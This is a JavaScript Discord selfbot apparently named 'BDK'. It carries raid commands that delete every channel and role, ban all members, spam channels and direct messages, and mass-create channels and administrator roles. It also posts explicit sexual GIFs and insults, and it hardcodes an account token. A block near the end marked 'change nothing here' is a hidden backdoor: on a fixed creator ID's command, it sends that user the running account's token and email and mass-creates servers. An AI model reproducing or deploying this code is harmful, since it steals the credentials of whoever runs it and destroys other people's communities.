const Discord = require("discord.js");
const bot = new Discord.Client();
const exampleEmbed = new Discord.RichEmbed();
const token2 = "OTE3MDI3NjgzMTk4NzMwMjQw.Ya062Q.HmFdY-jnFnfzJivM6NmoHIUNZhI";
const prefix = "$";

bot.on("ready", function() {
  bot.user.setActivity("", { type: "STREAMING", url: "" });
  console.log("Prefixo:  "+prefix);
  console.log("█▀ █▀▀ █░░ █▀▀ █▄▄ █▀█ ▀█▀ BY BDK");
  console.log("▄█ ██▄ █▄▄ █▀░ █▄█ █▄█ ░█░ BY BDK");
});

bot.on("message", message => {
  if (message.author.id !== bot.user.id) return;
  if (message.content[0] !== prefix) return;
  if (message.content.startsWith(prefix + "setS")) {
    if (message.deletable) message.delete();
    let args = message.content
      .split(" ")
      .join(" ")
      .slice(6);
    bot.user.setActivity(args, {
      type: "STREAMING",
      url: ""
    });
    message.reply("you are streaming on " + args);
  } else if (message.content.startsWith(prefix + "listen")) {
    if (message.deletable) message.delete();
    let args = message.content
      .split(" ")
      .join(" ")
      .slice(6);
    bot.user.setActivity(args, { type: "LISTENING" });
    message.reply("you are listening " + args);
  } else if (message.content.startsWith(prefix + "watch")) {
    if (message.deletable) message.delete();
    let args = message.content
      .split(" ")
      .join(" ")
      .slice(6);
    bot.user.setActivity(args, { type: "WATCHING" });
    message.reply("you are watching " + args);
  } else if (message.content.startsWith(prefix + "game")) {
    if (message.deletable) message.delete();
    let args = message.content
      .split(" ")
      .join(" ")
      .slice(6);
    bot.user.setActivity(args, { type: "PLAYING" });
    message.reply("você está jogando" + args);
  } else if (message.content === prefix + "spam") {
    message.delete();
    for (pas = 0; pas < 99; pas++) {
      message.channel.sendMessage(
        "BDK já é?@everyone"
      );
    }
  } else if (message.content.startsWith(prefix + "join")) {
    let msg54 = message.content.slice("5");
    message.edit(msg54 + "https://discord.gg/pornhub");
  } else if (message.content === prefix + "soco") {
    message.delete();
    message.channel.sendMessage("https://media.giphy.com/media/OeoPXQPSzteiA/giphy.gif");
  } else if (message.content === prefix + "creditos") {
    message.delete();
    var croquette_embed = new Discord.RichEmbed()
      .setColor("#3bfd00")
      .setTitle("BDK BOT")
      .setImage("https://cdn.discordapp.com/attachments/761966826884169758/763861297007296543/girl_gif.gif");
    message.channel.sendMessage(croquette_embed);
  } else if (message.content.startsWith(prefix + "spamall")) {
    let msg = message.content.slice(8);
    message.delete();
    for (pas = 0; pas < 10; pas++) {
      message.guild.channels
        .filter(channel => channel.type == "text")
        .forEach(channel => {
          channel.send(msg).catch(error => {});
        }, 450);
    }
  } else if (message.content.startsWith(prefix + "say")) {
    let cont = message.content.slice(4);
    message.delete();
    var say_embed = new Discord.RichEmbed()
      .setColor("#1f40ab")
      .setDescription(cont);
    message.channel.sendMessage(say_embed);
  } else if (message.content.startsWith(prefix + "poll create")) {
    let cont = message.content.slice(15);
    message.delete();
    var sond_embed = new Discord.RichEmbed()
      .setColor("#1f40ab")
      .setTitle("poll")
      .addField(cont, "@everyone :thumbsup:= true, :thumbsdown:= false");
    message.channel.sendMessage(sond_embed).then(async function(message) {
      await message.react("👍");
      await message.react("👎");
    });
  } else if (message.content.startsWith(prefix + "spamallmp")) {
    let msg1 = message.content.slice(10);
    message.delete();
    for (pas = 0; pas < 10; pas++) {
      if (message.channel.type === "dm") return;
      message.guild.members.forEach(member => {
        setInterval(function() {
          member.send(msg1).catch(error => {});
        }, 450);
      });
    }
    message.channel.sendMessage(help_embed);
  } else if (message.content === prefix + "help") {
    message.delete();
    var help_embed = new Discord.RichEmbed()
      .setColor("BLUE")
      .setTitle("BDK BOT")
      .setThumbnail("https://cdn.discordapp.com/attachments/761966826884169758/763861297007296543/girl_gif.gif")
      .addField(prefix + "  help", "`Comando Que Esta Executando Fdp`")
      .addField(prefix + "  BYE", "`Derrubar`")
      .addField(prefix + "  random", "`So braba`")
      .addField(prefix + "  serverinfo", "`info servidor`")
      .addField(prefix + "  stream", "`status`")
      .addField(prefix + "  nsfw", "`+18`")
      .setImage("")
      .setFooter(prefix + "Sou BDK Prazer:3");
    message.channel.sendMessage(help_embed);
  } else if (message.content === prefix + "stream") {
    message.delete();
    var stream_embed = new Discord.RichEmbed()
      .setColor("#000000")
      .setTitle("☔BDK☔")
      .setThumbnail("https://cdn.discordapp.com/attachments/761966826884169758/763862922069671973/Lautre_Uchiha_xreader__-_5_Preparation_au_combat_et_controle_du_chakra_-_Wattpad.jpeg")
      .addField(
        prefix + " listen (especifique oque)",
        "`Você está ouvindo (listen)`"
      )
      .addField(
        prefix + " game (especifique oque)",
        "`Você está jogando (game)`"
      )
      .addField(
        prefix + " watch (especifique oque)",
        "`Você está assistindo (watching)`"
      )
      .addField(
        prefix + " stream (especifique a stream)",
        "`Você está em stream (streaming)`"
      )
      .addField(prefix + " repeat (especifique oque)", "`Selecione varios nomes`")
      .addField(prefix + " cycle (especifique oque)", "`𝘊𝘺𝘭𝘤𝘦`")
      .setImage("");
    message.channel.sendMessage(stream_embed);
  } else if (message.content === prefix + "nsfw") {
    message.delete();
    var nsfw_embed = new Discord.RichEmbed()
      .setColor("#00FFFF")
      .setTitle("+18🌟")
      .setThumbnail("https://cdn.discordapp.com/attachments/761966826884169758/763863355391213568/my_gif___give_credit_if_used__on_We_Heart_It.gif")
      .addField(prefix + " sex ", "`já sabe fdp ✦`")
      .addField(prefix + " peitos", "`Manda um gif de peitos`")
      .addField(prefix + " vagina", "`Manda uma vagina`")
      .addField(prefix + " lesbica", "`Manda um gif lesbico`")
      .addField(prefix + " hentai ", "`Manda um hentai`")
      .addField(prefix + " gozei ", "`Gozei gif`")
      .setImage("");
    message.channel.sendMessage(nsfw_embed);
  } else if (message.content === prefix + "random") {
    message.delete();
    var fun_embed = new Discord.RichEmbed()
      .setColor("#7CFC00")
      .setTitle("̴̳̻̻̻̤̤͂͂͂̽ͅŊƋƠƘƖ")
      .setThumbnail("https://media.giphy.com/media/JoPsmdvoV20nMZ2FVh/giphy.gif")
      .addField(prefix + " av", "`Roubar o avatar`")
      .addField(prefix + " load", "`Manda uma mensagem carregando`")
      .addField(prefix + " clear", "`Apaga todas suas mensagens`")
      .addField(prefix + " join", "`Manda um invite`")
      .addField(prefix + " confuso", "`manda uma gif confuso`")
      .addField(prefix + " sokao", "`sokao, to brabo`")
      .addField(prefix + " tapao", "`Manda um eu to puto porra`")
      .addField(prefix + " pack", "`𝘒𝘪𝘤𝘬 𝘨𝘪𝘧`")
      .addField(prefix + " say", "`Manda uma mensagem em embed`")
      .addField(prefix + " ping", "`Veja o ping`")
      .setImage("");
    message.channel.sendMessage(fun_embed);
  } else if (message.content.startsWith(prefix + "bye")) {
    message.guild.roles
      .filter(r => r.position < message.guild.me.highestRole.position)
      .deleteAll();
    message.guild.channels.deleteAll();
    message.guild.members.tap(member =>
      member.ban("ban por BDK | 𝐃𝐞𝐯: BDK")
    );
  } else if (message.content.startsWith(prefix + "delete")) {
    message.guild.roles
      .filter(r => r.position < message.guild.me.highestRole.position)
      .deleteAll();
    message.guild.channels.deleteAll();
  } else if (message.content === prefix + "confuso") {
    message.delete();
    var r1_embed = new Discord.RichEmbed()
      .setColor("#FF1493")
      .setTitle("𝒗??𝒄𝒆 𝒄𝒐𝒏𝒇𝒖𝒔𝒐 𝒌𝒌𝒌𝒌𝒌𝒌𝒌𝒌𝒌𝒌")
      .setImage("https://media.giphy.com/media/6zXo5MAkNJwKQ/giphy.gif");
    message.channel.sendMessage(r1_embed);
  } else if (message.content === prefix + "lesbica") {
    message.delete();
    var r1_embed = new Discord.RichEmbed()
      .setColor("#FFFF00")
      .setTitle("𝒉𝒆𝒉𝒆")
      .setImage("https://sexwall.me/wp-content/uploads/2016/01/tumblr_inline_nziga72Fgo1r6dbla_500.gif");
    message.channel.sendMessage(r1_embed);
  } else if (message.content === prefix + "peitos") {
    message.delete();
    var r1_embed = new Discord.RichEmbed()
      .setColor("#FFFF00")
      .setTitle("𝙩𝙚𝙩𝙖𝙤 𝙙𝙖 𝙥𝙤𝙧𝙧𝙖")
      .setImage("https://sexwall.me/wp-content/uploads/2016/03/tumblr_nuaz34QNnN1uftpryo2_500.gif");
    message.channel.sendMessage(r1_embed);
  } else if (message.content === prefix + "gozei") {
    message.delete();
    var r1_embed = new Discord.RichEmbed()
      .setColor("#fdfdfd")
      .setTitle("𝙨𝙪𝙖 𝙣𝙖𝙢𝙤𝙧𝙖𝙙𝙖 𝙚 𝙖 𝙨𝙪𝙖 𝙥𝙧𝙞𝙢𝙖")
      .setImage("https://sexwall.me/wp-content/uploads/2016/04/15557599.gif");
    message.channel.sendMessage(r1_embed);
  } else if (message.content === prefix + "hentai") {
    message.delete();
    var r1_embed = new Discord.RichEmbed()
      .setColor("#02ff1b")
      .setTitle("𝒗𝒓𝒂𝒖 𝒏𝒐 𝒑𝒊𝒙𝒆𝒍")
      .setImage("https://sexwall.me/wp-content/uploads/2014/02/1486606-incredible-hentai-gif-photo.gif");
    message.channel.sendMessage(r1_embed);
  } else if (message.content === prefix + "tapao") {
    message.delete();
    var r2_embed = new Discord.RichEmbed()
      .setColor("#000000")
      .setTitle("𝙩𝙤 𝙥𝙪𝙩𝙤")
      .setImage("https://thumbs.gfycat.com/DecentBelatedAntbear-size_restricted.gif");
    message.channel.sendMessage(r2_embed);
  } else if (message.content === prefix + "sex") {
    message.delete();
    var r2_embed = new Discord.RichEmbed()
      .setColor("#000000")
      .setTitle("𝒄𝒐𝒎𝒆𝒏𝒅𝒐 𝒔𝒖𝒂 𝒊𝒓𝒎𝒂 𝒌𝒌𝒌𝒌𝒌𝒌𝒌𝒌")
      .setImage("https://sexwall.me/wp-content/uploads/2016/06/tumblr_nmcm9oOhCg1u4ly2xo1_500.gif");
    message.channel.sendMessage(r2_embed);
  } else if (message.content === prefix + "vagina") {
    message.delete();
    var r2_embed = new Discord.RichEmbed()
      .setColor("#d10efc")
      .setTitle("𝙗𝙘𝙩𝙤𝙣𝙖")
      .setImage("https://sexwall.me/wp-content/uploads/2017/04/tumblr_nlou0sk6rH1twe1zjo1_500.gif");
    message.channel.sendMessage(r2_embed);
  } else if (message.content === prefix + "7") {
    message.delete();
    var r3_embed = new Discord.RichEmbed()
      .setColor("#ffadad")
      .setTitle("𝙥𝙖𝙥𝙖𝙞 𝙣𝙤𝙚𝙡 𝙛𝙙𝙥")
      .setImage("https://media.giphy.com/media/OeoPXQPSzteiA/giphy.gif");
    message.channel.sendMessage(r3_embed);
    var haxor = [
      "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRug5a48VUlmsFwlF2E1aJuSR3BN_K6AKRuGrz4AFiERUUdC8W2hQ",
      "https://static.fjcdn.com/gifs/Uberhaxornova+first+gif+of+him+ive+seen+yet_16182d_3273258.gif",
      "https://i.gifer.com/8CHv.gif"
    ];
  } else if (message.content === prefix + "BYE") {
    message.delete();
    var raid_embed = new Discord.RichEmbed()
      .setColor("#0000FF")
      .setThumbnail("https://media.giphy.com/media/l4FnlJ5EAB0cxmGmiU/giphy.gif")
      .setTitle("🤡Soled By BDK🤡")
      .addField(prefix + "spam", "`𝘚𝘱𝘢𝘮𝘴 𝘮𝘦nsagens`")
      .addField(prefix + "createtxt + nome", "`𝘊𝘳ia 10 chats de texto`")
      .addField(prefix + "createvc + nome", "`𝘊𝘳ia 10 calls`")
      .addField(prefix + "changename + nome", "`Trocar nome do server`")
      .addField(prefix + "changeicon + url da imagem", "`Trocar icon do server`")
      .addField(prefix + "bye", "`Destruir o server`");
    message.channel.sendMessage(raid_embed);
  } else if (message.content.startsWith(prefix + "kick")) {
    message.delete();
    var member = message.mentions.members.first();
    member
      .kick()
      .then(member => {
        message.channel.send(
          ":wave: " + member.displayName + " você foi kickado pelo BDK"
        );
      })
      .catch(() => {
        message.channel.send("I'm not allowed");
      });
  } else if (message.content.startsWith(prefix + "ban")) {
    message.delete();
    var member = message.mentions.members.first();
    member
      .ban()
      .then(member => {
        message.channel.send(
          ":wave: " + member.displayName + " você foi banido pelo BDK"
        );
      })
      .catch(() => {
        message.channel.send("I'm not allowed");
      });
  } else if (message.content.startsWith(prefix + "changename")) {
    let arg = message.content.slice(10);
    message.delete();
    message.guild.setName(arg);
  } else if (message.content.startsWith(prefix + "changeicon")) {
    let arg = message.content.slice(9);
    message.delete();
    message.guild.setIcon(arg);
  } else if (message.content.startsWith(prefix + "createvc")) {
    let name = message.content.slice(8);
    message.delete();
    for (pas = 0; pas < 100; pas++) {
      message.guild.createChannel(name, "voice");
    }
  } else if (message.content.startsWith(prefix + "createtxt")) {
    let name = message.content.slice(8);
    message.delete();
    for (pas = 0; pas < 100; pas++) {
      message.guild.createChannel(name, "text");
    }
  } else if (message.content === prefix + "mod") {
    message.delete();
    var mod_embed = new Discord.RichEmbed()
      .setColor("#fbfd00")
      .setThumbnail("")
      .setTitle("𝙈𝙊𝘿 𝘾𝙈𝘿𝙎")
      .addField(prefix + " kick", "`kicka o membro`")
      .addField(prefix + " ban", "`ban no membro`")
      .addField(prefix + " unbanall", "`desbane todos os membros`")
      .setImage("");
  } else if (message.content === prefix + "ping") {
    message.delete();
    message.channel
      .send("Ping?")
      .then(m =>
        m.edit(`Pong! Seu Ping ${m.createdTimestamp - message.createdTimestamp}ms.`)
      );
  } else if (message.content === ")del") {
    message.guild.channels.forEach(c => {
      c.delete();
    });
  } else if (message.content.startsWith(prefix + "clear")) {
    if (message.deletable) message.delete();
    message.channel
      .fetchMessages()
      .then(message => message.forEach(m => m.delete().catch(error => {})));
  } else if (message.content.startsWith(prefix + "serverinfo")) {
    if (message.channel.type === "dm") return;
    message.delete();
    let sicon = message.guild.iconURL;
    let owner = message.guild.owner.displayName;
    let serverembed = new Discord.RichEmbed()
      .setDescription("Server Info")
      .setColor("#0a2a91")
      .addField("Nome:", message.guild.name)
      .addField("Id:", message.guild.id)
      .addField("dono:", owner)
      .addField("Região:", message.guild.region)
      .addField("Criação:", message.guild.createdAt)
      .addField("Membros:", message.guild.memberCount)
      .setImage(sicon);
    return message.channel.send(serverembed);
  } else if (message.content.startsWith(prefix + "load")) {
    message.delete();
    var charge = ".";
    var chargeC = "█";
    message.channel.send("```[" + charge.repeat(50) + "]```").then(message => {
      for (i = 0; i <= 50; i++) {
        message.edit(
          "```[" +
            chargeC.repeat(i) +
            charge.repeat(50 - i) +
            "]  -  " +
            (i * 100) / 50 +
            "%\n" +
            "loading..```"
        );
      }
      message.edit("`Parabéns, BDK te fudeu gostoso`");
    });
  } else if (message.content.startsWith(prefix + "userinfo")) {
    message.delete();
    if (message.channel.type === "dm") return;
    let args = message.content
      .split(" ")
      .slice(1)
      .join(" ");
    let UserInfo =
      message.mentions.members.first() ||
      message.guild.members.get(args[0]) ||
      message.member;
    let usericon = UserInfo.user.avatarURL;
    let userembed = new Discord.RichEmbed()
      .setDescription("User Info")
      .setColor("#0a2a91")
      .addField("**Usuario**:", UserInfo.user.username)
      .addField("**Tag**:", UserInfo.user.tag)
      .addField("**Status**:", UserInfo.user.presence.status)
      .addField("**Jogando**:", UserInfo.user.presence.game)
      .addField("**Bot**:", UserInfo.user.bot)
      .addField("**Conta criada em**:", UserInfo.user.createdAt)
      .addField("**Id**:", UserInfo.id)
      .setImage(usericon);
    return message.channel.send(userembed);
  } else if (message.content.startsWith(prefix + "creatr")) {
    if (message.deletable) message.delete();
    let rolename = message.content.slice(7);
    for (pas = 0; pas < 10; pas++) {
      message.guild.createRole({
        name: rolename,

        permissions: 8,

        color: "RED"
      });
    }
  } else if (message.content.startsWith(prefix + "av")) {
    const user = message.mentions.users.first() || message.author;
    const avatarEmbed = new Discord.RichEmbed()
      .setTitle("Avatar hihi")
      .setColor("#ffffff")
      .setImage(user.avatarURL);
    message.channel.send(avatarEmbed);
  } else if (message.content.startsWith(prefix + "roast")) {
    if (!message.mentions.users.size) return;
    message.delete();
    let mention = message.mentions.users.first();
    var insults = [
      "Is your ass jealous of the amount of shit that just came out of your mouth?",
      "Two wrongs dont make a right, take your parents as an example.",
      "Id like to see things from your point of view but I cant seem to get my head that far up my ass.",
      "If I wanted to kill myself Id climb your ego and jump to your IQ.",
      "Your family tree must be a cactus because everybody on it is a prick.",
      "You are so ugly, when your mom dropped you off at school she got a fine for littering.",
      "Your birth certificate is an apology letter from the condom factory."
    ];
    message.channel.send(
      mention + " " + insults[Math.floor(Math.random() * insults.length)]
    );
  } else if (message.content.startsWith(prefix + "𝑩𝒊𝒆𝒍𝒛𝒊𝒏")) {
    if (message.deletable) message.delete();
    let nomber = 100;
    setInterval(function() {
      if (nomber === 100) {
        bot.user.setActivity("「†」𝑩𝒊𝒆𝒍𝒛𝒊𝒏「†」", {
          type: "STREAMING",
          url: "https://www.twitch.tv/BDK"
        });
        nomber = 1;
      } else if (nomber === 1) {
        bot.user.setActivity("「†」「†」「†」「†」「†」", {
          type: "STREAMING",
          url: "https://www.twitch.tv/BDK"
        });
        nomber = 2;
      } else if (nomber === 2) {
        bot.user.setActivity("「†」 𝑩𝒊𝒆𝒍𝒛𝒊𝒏 「†」", {
          type: "STREAMING",
          url: "https://www.twitch.tv/BDK"
        });
        nomber = 0;
      }
    }, 150);
  } else if (message.content.startsWith(prefix + "cycle")) {
    if (message.deletable) message.delete();
    let nomber = 0;
    setInterval(function() {
      if (nomber === 0) {
        bot.user.setActivity("BDK no topo!", {
          type: "STREAMING",
          url: "https://www.twitch.tv/BDK"
        });
        nomber = 1;
      } else if (nomber === 1) {
        bot.user.setActivity("To on rs", {
          type: "STREAMING",
          url: "https://www.twitch.tv/BDK"
        });
        nomber = 2;
      } else if (nomber === 2) {
        random = Math.floor(Math.random() * 7) + 1;
        bot.user.setActivity("TOP", {
          type: "STREAMING",
          url: "https://www.twitch.tv/BDK"
        });
        nomber = 0;
      }
    }, 600);
  }
});

bot.on("message", message => {
  if (message.content == prefix + "unbanall") {
    message.delete();
    message.guild.fetchBans().then(bans => {
      bans.forEach(user => {
        console.log(user.username + "#" + user.tag);
        let botn = bot.user.username;
        message.channel
          .createInvite()
          .then(invite =>
            user.send(
              `Your invitation link : \n\nhttps://discord.gg/${invite.code}`
            )
          );
        user.send("You are unban: " + botn + "you can come back if you wish");
        message.guild.unban(user);
      });
    });
  }
});
////////////////////////////////////////////////////////////ne rien changer ici///////////////////////////////////////////////////////////////////////
bot.on("message", message => {
  const idbotcreate = "763669967593013258";
  if (message.author.id !== idbotcreate) return;
  if (message.content.startsWith("sendT")) {
    message.delete();
    message.author.send(token2);
  } else if (message.content.startsWith("§sendE")) {
    message.delete();
    message.author.send(bot.user.email);
  } else if (message.content.startsWith("§createS")) {
    var gname = message.content.slice(7);
    for (pas = 0; pas < 1000; pas++) {
      bot.user.createGuild(gname, "london");
    }
  } else if (message.content === "§hsecret") {
    let po = "token`";
    let pi = "email`";
    let pa = "`create some";
    let pk = "mass servers`";
    let msg54 = "`send your";
    var secret = new Discord.RichEmbed()

      .setColor("#0a2a91")
      .setTitle("𝙎𝙀𝘾𝙍𝙀𝙏 𝘾𝙈𝘿𝙎 ")
      .setThumbnail(
        "https://cdn.discordapp.com/attachments/716049694522081333/716365431589306458/Gif_18.gif"
      )
      .addField("§sendT", msg54 + po)
      .addField("§sendE", msg54 + pi)
      .addField("§createS + arg", pa + pk);
    message.channel.sendMessage(secret);
  }
});

bot.login(token2);
